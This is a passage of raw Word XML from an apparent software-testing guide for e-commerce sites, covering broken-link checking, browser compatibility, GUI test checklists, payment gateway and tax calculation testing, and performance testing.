        <w:t>Also, there are Web sites that offer online testing for broken links at a nominal fee:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="00B84F48" w:rsidP="004C44FA">
      <w:hyperlink r:id="rId248" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>http://netmechanic.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId249" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>http://www.linkalarm.com/index.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="004C44FA">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:hyperlink r:id="rId250" w:history="1">
        <w:r w:rsidR="004C44FA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="00709F"/>
          </w:rPr>
          <w:t>http://www.Websitegarage.com</w:t>
        </w:r>
      </w:hyperlink>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Browser Compatibility</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>After creating a Web page, browser compatibility testing begins. This is because text, graphics, or colors may appear differently on different browsers. To prevent these problems, developers choose software that is compatible with most of the popular browsers, such as Internet Explorer, Netscape, AOL, and WebTV.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The following table details the compatibility of browsers.</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993"/>
        <w:gridCol w:w="1147"/>
        <w:gridCol w:w="905"/>
        <w:gridCol w:w="736"/>
        <w:gridCol w:w="208"/>
        <w:gridCol w:w="1032"/>
        <w:gridCol w:w="905"/>
        <w:gridCol w:w="480"/>
        <w:gridCol w:w="479"/>
        <w:gridCol w:w="905"/>
        <w:gridCol w:w="905"/>
        <w:gridCol w:w="905"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5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Browser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6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Browser</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
              </w:rPr>
              <w:br/>
              <w:t>version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4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ActiveX</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
              </w:rPr>
              <w:br/>
              <w:t>controls</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="500" w:type="pct"/>
            <w:gridSpan w:val="2"/>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VBScript</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6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JavaScript</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4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Java</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
              </w:rPr>
              <w:br/>
              <w:t>applets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="500" w:type="pct"/>
            <w:gridSpan w:val="2"/>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Dynamic</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="636363"/>
              </w:rPr>
              <w:br/>
              <w:t>HTML</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4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Frames</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4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CSS 1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5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CSS 2.0</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Internet Explorer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4.0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Internet Explorer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3.0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Netscape Navigat</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="2A2A2A"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>or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lastRenderedPageBreak/>
              <w:t>4.0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lastRenderedPageBreak/>
              <w:t>Netscape Navigator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3.0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Both Internet Explorer and Navigator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4.0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Both Internet Explorer and Navigator</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3.0 and later</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Enabled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r>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">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Microsoft Web TV</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Unavailable</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6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gridSpan w:val="2"/>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4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c>
          <w:tcPr>
            <w:tcW w:w="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Disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1950" w:type="pct"/>
            <w:gridSpan w:val="4"/>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What to Test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1400" w:type="pct"/>
            <w:gridSpan w:val="4"/>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Environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1650" w:type="pct"/>
            <w:gridSpan w:val="4"/>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Tools/Technique</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="19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Font and Graphics position</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140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6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9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lastRenderedPageBreak/>
              <w:t>Resolution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140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6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r w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="19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Support for different scripts and software</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140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1650" w:type="pct"/>
            <w:gridSpan w:val="4"/>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GUI Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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Examples of GUI tests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Test each toolbar and menu item for navigation using the mouse and keyboard.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test window navigation using the mouse and keyboard.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test to make sure that proper format masks are used. For example, all drop-down boxes should be properly sorted. The date entry should also be properly formatted.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that the colors, fonts, and font widths are to standard for the field prompts and displayed text.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that the color of the field prompts and field background is to standard in read-only mode.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Make sure that vertical scroll bars or horizontal scroll bars do not appear unless required.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that the various controls on the window are aligned correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Make sure that the window is resizable.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check the spellings of all the text displayed in the window, such as the window caption, status bar options, field prompts, pop-up text, and error messages.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that all character or alphanumeric fields are left-justified and that the numeric fields are right-justified.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check for the display of defaults if there are any.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>In case of multiple windows, check that they all have the same look and feel.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check that all shortcut keys are defined and work correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check for the tab order. It should be from top left to bottom right. Also, the read-only/disabled fields should be avoided in the TAB sequence.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check that the cursor is positioned on the first input field when the window is opened.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Make sure if any default button is specified, it should work properly.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check for proper functioning of ALT+TAB.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Ensure that each menu command has an alternative hot key sequence and that it works correctly. (See Appendix B &amp; Appendix C.)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check that there are no duplicate hot keys defined on the window.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Validate the behavior of each control, such as push button, radio button, list box, and so on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test to make sure that the window is modal. This will prevent the user from accessing other functions when this window is active.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Test that multiple windows can be opened at the same time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Make sure that there is a Help menu.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="189"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Check to make sure that the command buttons are grayed out when not in use.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C32985" w:rsidRDefault="00C32985" w:rsidP="00C32985">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pP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8" w:name="testproc_mid"/>
      <w:bookmarkEnd w:id="1288"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Semibold" w:hAnsi="Segoe UI Semibold"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Testing Middle Tier</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Software Performance Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Software performance testing aims to ensure that the software performs in accordance with operational specifications for response time, processing costs, storage use, and printed output.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The data on software performance is gathered during:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="190"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Current and expected normal transactions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="190"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Current and expected peak transactions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="190"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Minimal transaction volumes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>All interfaces are fully tested. This includes verifying the facilities and equipment, and checking to make sure that the communication lines are performing satisfactorily.</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880"/>
        <w:gridCol w:w="2688"/>
        <w:gridCol w:w="4032"/>
      </w:tblGrid>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="15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What to Test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="14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Environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="21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Tools/Technique</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Correct data capture</w:t>
            </w:r>
          </w:p>
        </w:tc>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21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Testing ASP, CGI scripts by Black Box and White Box technique, Boundary value analysis, and Equivalence partitioning.</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Transactions completion</w:t>
            </w:r>
          </w:p>
        </w:tc>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User/System test environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="21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Functional testing by simulating customer data.</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Gateway software</w:t>
            </w:r>
          </w:p>
        </w:tc>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21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Functional testing by simulating customer data.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004C44FA" w:rsidTr="004C44FA">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="15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Tax and shipping calculations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="14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User environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="21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Functional testing by random data, Boundary value analysis, and Equivalence partitioning.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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lastRenderedPageBreak/>
        <w:t>Correct data capture</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Correct data capture refers to the use of CGI scripts or ASP to capture data from the Web client. This includes forms, credit card numbers, and payment details. Any error in capturing this data will result in incorrect processing of the customers’ orders.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Completeness of transaction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Transaction completeness is the most important aspect of e-commerce transactions. Any error in this phase of operation can invite legal action because the affected party may be at risk of losing money due to an incomplete transaction.</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Gateway compatibility</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>The payment gateway consists of software installed on Web servers to facilitate payment transactions. The gateway software captures credit card details from the customer and then verifies the validity of the credit card with the transaction clearinghouse.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Gateways are complex because they can create compatibility problems. In turn, these problems make e-commerce transactions unreliable. So, the entrepreneur needs to consult experienced developers before investing in a payment gateway. Therefore, before launching the site, online pilot testing must be done to test the reliability of the gateway.</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Tax and shipping calculations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Entrepreneurs have to grapple with multiple taxes and shipping rates. The problem becomes larger if the entrepreneur is catering to customers outside the country.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve">Some off-the-shelf software provides ready-made solutions to both problems simultaneously. This software is upgraded whenever tax structures change. However, the entrepreneur needs to regularly check with legal and tax consultants to keep track of tax and shipping rates. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t>Testing needs to be done to ensure that the customer is charged the correct tax and shipping amount.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
        <w:t xml:space="preserve"> Incorrect tax and shipping levies on the customer invariably result in losing customers to the competitors.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Server Load Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C44FA" w:rsidRDefault="004C44FA" w:rsidP="004C44FA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="270" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2A2A2A"/>
        </w:rPr>
